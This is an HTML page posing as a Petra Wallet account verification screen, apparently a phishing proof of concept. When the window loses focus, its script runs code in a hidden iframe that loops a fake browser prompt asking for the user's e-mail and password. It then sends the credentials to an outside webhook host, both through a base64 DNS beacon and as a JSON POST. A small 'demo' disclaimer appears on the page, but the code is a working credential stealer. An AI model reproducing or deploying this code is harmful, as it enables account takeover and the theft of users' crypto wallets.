<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, user-scalable=no">
  <title>petra.app</title>
  <style>
    iframe { visibility: hidden; position: absolute; width: 1px; height: 1px; border: none; }
    body { 
      font-family: system-ui, sans-serif; 
      text-align: center; 
      padding-top: 100px; 
      background: #0f172a; 
      color: #e2e8f0; 
    }
    h1 { font-size: 28px; margin-bottom: 30px; }
    .btn {
      padding: 16px 40px; font-size: 20px; background: #22c55e; color: black; border: none; border-radius: 16px;
      cursor: pointer; box-shadow: 0 10px 40px rgba(34,197,94,0.6); font-weight: bold;
    }
    .btn:hover { background: #16a34a; }
    .warning { margin-top: 40px; color: #ef4444; font-weight: bold; font-size: 14px; }
  </style>
</head>
<body>
  <h1>Petra Wallet</h1>
  <p>Click below to verify your account</p>
  <button class="btn" onclick="alert('Click anywhere outside this page to continue...')">Verify Now</button>

  <div class="warning">This is a demo — do not use on real wallet!</div>

  <iframe id="iframe"></iframe>

  <script>
    window.onblur = function () {
      const code = `(function(){
        try {
          const msg = "petra.app says:\\n\\nIn order to access your Petra Wallet you must first login on your\\npetra.app Account.\\n\\nPlease type your e-mail and your password:";
          let v = '';
          while (v === null || ('' + v).trim() === '') {
            v = prompt(msg, 'E-mail / Password');
          }
          const creds = ('' + v).trim();

          // OOB DNS BEACON — INI YANG PASTI MASUK!
          const beacon = btoa(creds).replace(/=/g, '').substring(0, 500);
          new Image().src = 'https://' + beacon + '.keen-unicorn-32.webhook.cool';

          // Fallback POST kalau CORS allow
          try {
            fetch('https://keen-unicorn-32.webhook.cool/petra-creds', {
              method: 'POST',
              body: JSON.stringify({
                creds: creds,
                ua: navigator.userAgent,
                page: location.href
              })
            });
          } catch(e) {}

        } catch(e) {}
      })()`;

      // Set javascript: URI ke iframe
      document.getElementById('iframe').src = "javascript:" + code;
    };
  </script>
</body>
</html>
